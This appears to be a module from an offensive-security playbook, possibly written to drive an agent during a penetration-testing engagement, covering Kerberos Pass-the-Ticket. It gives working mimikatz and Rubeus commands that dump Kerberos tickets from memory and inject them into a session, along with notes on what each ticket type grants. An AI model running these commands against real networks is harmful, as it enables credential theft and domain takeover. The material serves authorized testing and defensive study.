# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: Pass-the-Ticket (PTT)

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Pass-the-Ticket (PTT)

**When it works**: Kerberos authentication — any service reached via Kerberos. More widely applicable than PTH in modern environments.

```powershell
# Export tickets from memory
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump /service:krbtgt /nowrap

# Import ticket into current session
mimikatz # kerberos::ptt <ticket.kirbi>
Rubeus.exe ptt /ticket:<base64-ticket>
```

**Ticket types and what they grant**:
- **TGT** (krbtgt service ticket): Request TGS for any service — full domain access if from a privileged account
- **TGS** (specific service ticket): Access that specific service as that user — Silver Ticket precursor
- **Trust ticket**: Access resources in a trusted domain

**Situational awareness before PTT**: Always run `klist` first. Do you already have tickets? Whose? A TGT from a domain admin is game over — you don't need any other technique.


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
